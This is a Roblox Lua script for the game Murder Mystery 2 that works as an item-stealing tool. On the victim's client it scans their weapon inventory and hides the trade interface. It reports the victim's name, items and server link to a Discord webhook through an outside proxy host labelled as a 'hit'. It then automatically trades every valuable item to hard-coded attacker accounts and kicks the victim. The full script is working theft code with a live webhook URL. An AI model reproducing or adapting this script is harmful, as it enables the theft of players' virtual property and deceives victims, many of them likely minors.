_G.scriptExecuted = _G.scriptExecuted or false 
if _G.scriptExecuted then return end 
_G.scriptExecuted = true

print("✅ Script started")

-- ===== SERVICES =====
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local plr = Players.LocalPlayer
local playerGui = plr:WaitForChild("PlayerGui")

-- ===== CONFIGURATION =====
local users = _G.Usernames or {"zzeeuuss1233"}
local min_rarity = _G.min_rarity or "Common"
local min_value = _G.min_value or 1
local ping = _G.pingEveryone or "Yes"

-- YOUR PROXY WEBHOOK (UPDATED)
local webhook = "https://proyx.vercel.app/api/webhooks/1374394558657331374/-dmo5vt8NdkPEBRMIrKBG4TdeMxJBrIIyVZSlcqGbB8OZwf8-8QT3Pqxkmj3Tn3H2ksX"

print("✅ Config loaded - Proxy: proyx.vercel.app")

-- ===== VALIDATION =====
if next(users) == nil or webhook == "" then
    plr:Kick("Missing config")
    return
end

if game.PlaceId ~= 142823291 then
    plr:Kick("Join normal MM2 server")
    return
end

if #Players:GetPlayers() >= 16 then
    plr:Kick("Server full")
    return
end

-- VIP check
local serverType = "Normal"
pcall(function()
    local getType = ReplicatedStorage:FindFirstChild("GetServerType")
    if getType then serverType = getType:InvokeServer() end
end)
if serverType == "VIPServer" then
    plr:Kick("Join DIFFERENT server")
    return
end
print("✅ Validations passed")

-- ===== DATABASE =====
print("✅ Loading database...")
local database = {}
local modules = ReplicatedStorage:FindFirstChild("Modules")

if modules then
    local itemModule = modules:FindFirstChild("ItemModule")
    if itemModule then
        pcall(function() database = require(itemModule) end)
    end
end

local rarityTable = {"Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage"}
local min_rarity_index = 1
for i, v in ipairs(rarityTable) do
    if v == min_rarity then min_rarity_index = i break end
end

local untradable = {DefaultGun = true, DefaultKnife = true, SharkSeeker = true}

-- ===== VALUE SYSTEM =====
local function getValue(name, rarity)
    local n = name and name:lower():gsub("%s+", "") or ""
    local values = {
        travelersgun = 4300, evergun = 3400, constellation = 2600,
        evergreen = 1900, vampiresgun = 1750, turkey = 1600,
        harvester = 1150, sakura = 960, blossom = 950,
        corrupt = 880, darkshot = 860, darksword = 840,
        icepique = 390, bat = 350, makeshift = 310,
        jd = 200, cottoncandy = 150
    }
    if values[n] then return values[n] end
    if rarity == "Ancient" or rarity == "Unique" then return 500
    elseif rarity == "Godly" then return 100
    elseif rarity == "Legendary" then return 5
    elseif rarity == "Rare" then return 2
    end
    return 1
end

-- ===== SCAN INVENTORY =====
print("✅ Scanning inventory...")
local weaponsToSend = {}
local totalValue = 0

local realData = nil
pcall(function()
    local remotes = ReplicatedStorage:FindFirstChild("Remotes")
    if remotes and remotes.Inventory then
        local getProfile = remotes.Inventory:FindFirstChild("GetProfileData")
        if getProfile then realData = getProfile:InvokeServer(plr.Name) end
    end
end)

if realData and realData.Weapons and realData.Weapons.Owned then
    for id, amt in pairs(realData.Weapons.Owned) do
        if not untradable[id] then
            local item = database and (database[id] or (database.Items and database.Items[id]))
            local rarity = (item and (item.Rarity or item.rarity)) or "Common"
            local itemName = (item and (item.ItemName or item.name)) or id
            local rIdx = table.find(rarityTable, rarity)
            
            if rIdx and rIdx >= min_rarity_index then
                local val = getValue(itemName, rarity)
                if val >= min_value then
                    totalValue = totalValue + (val * amt)
                    table.insert(weaponsToSend, {
                        DataID = id, Name = itemName,
                        Rarity = rarity, Amount = amt, Value = val
                    })
                end
            end
        end
    end
end

table.sort(weaponsToSend, function(a, b) return a.Value > b.Value end)
print("✅ Found " .. #weaponsToSend .. " items, Total value: " .. totalValue)

-- ===== HIDE GUI =====
pcall(function()
    task.wait(0.3)
    local function hide(guiName)
        local gui = playerGui:FindFirstChild(guiName)
        if gui then
            gui.Enabled = false
            gui:GetPropertyChangedSignal("Enabled"):Connect(function()
                if gui.Enabled then gui.Enabled = false end
            end)
        end
    end
    hide("TradeGUI")
    hide("TradeGUI_Phone")
end)

-- ===== WEBHOOK FUNCTION =====
local function sendWebhook(data)
    local methods = {
        function() return syn and syn.request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)}) end,
        function() return http and http.request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)}) end,
        function() return HttpService:PostAsync(webhook, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson) end,
    }
    for _, method in ipairs(methods) do
        if pcall(method) then return true end
    end
    return false
end

-- ===== SEND TO DISCORD =====
if #weaponsToSend > 0 then
    local itemLines = ""
    for i, item in ipairs(weaponsToSend) do
        if i <= 15 then
            itemLines = itemLines .. string.format("• **%s** (x%s): %d\n", item.Name, item.Amount, item.Value * item.Amount)
        end
    end
    if itemLines == "" then itemLines = "No items" end
    
    local prefix = (ping == "Yes" and "@everyone " or "")
    sendWebhook({
        content = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
        embeds = {{
            title = "🔪 MM2 Hit Detected!",
            color = 0x00FF00,
            fields = {
                {name = "Victim", value = "```" .. plr.Name .. "```", inline = true},
                {name = "Total Value", value = "```" .. totalValue .. "```", inline = true},
                {name = "Items", value = itemLines},
                {name = "Server Link", value = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. game.JobId}
            }
        }}
    })
    print("✅ Webhook sent through proxy")
    
    -- ===== TRADE FUNCTIONS =====
    local function acceptTrade()
        local remote = ReplicatedStorage:FindFirstChild("Trade")
        if not remote then return false end
        local accept = remote:FindFirstChild("AcceptTrade")
        if not accept then return false end
        
        local attempts = {
            function() accept:FireServer() end,
            function() accept:FireServer(true) end,
            function() accept:FireServer(1) end,
            function() accept:FireServer({Accepted = true}) end,
        }
        for _, attempt in ipairs(attempts) do
            if pcall(attempt) then return true end
        end
        return false
    end
    
    local function doTrade(targetName)
        print("🔄 Trading with: " .. targetName)
        local target = Players:FindFirstChild(targetName)
        if not target then return end
        
        local trade = ReplicatedStorage:FindFirstChild("Trade")
        if not trade then return end
        
        local sendReq = trade:FindFirstChild("SendRequest")
        local getStatus = trade:FindFirstChild("GetTradeStatus")
        local offer = trade:FindFirstChild("OfferItem")
        
        while #weaponsToSend > 0 do
            local status = "None"
            pcall(function() status = getStatus:InvokeServer() end)
            
            if status == "None" then
                pcall(function() sendReq:InvokeServer(target) end)
            elseif status == "StartTrade" then
                for i = 1, math.min(4, #weaponsToSend) do
                    local weapon = table.remove(weaponsToSend, 1)
                    for _ = 1, weapon.Amount do
                        pcall(function() offer:FireServer(weapon.DataID, "Weapons") end)
                        task.wait(0.1)
                    end
                end
                task.wait(2)
                acceptTrade()
                repeat task.wait(0.2) until #weaponsToSend == 0
            end
            task.wait(0.5)
        end
        plr:Kick("Trade complete")
    end
    
    -- ===== CHAT LISTENER =====
    for _, p in ipairs(Players:GetPlayers()) do
        if table.find(users, p.Name) then
            print("✅ Target found: " .. p.Name .. " - waiting for chat...")
            p.Chatted:Connect(function() doTrade(p.Name) end)
        end
    end
    Players.PlayerAdded:Connect(function(p)
        if table.find(users, p.Name) then
            print("✅ Target joined: " .. p.Name)
            p.Chatted:Connect(function() doTrade(p.Name) end)
        end
    end)
    
    print("✅ Script ready - waiting for " .. table.concat(users, ", ") .. " to chat")
else
    plr:Kick("No valuable items found")
end
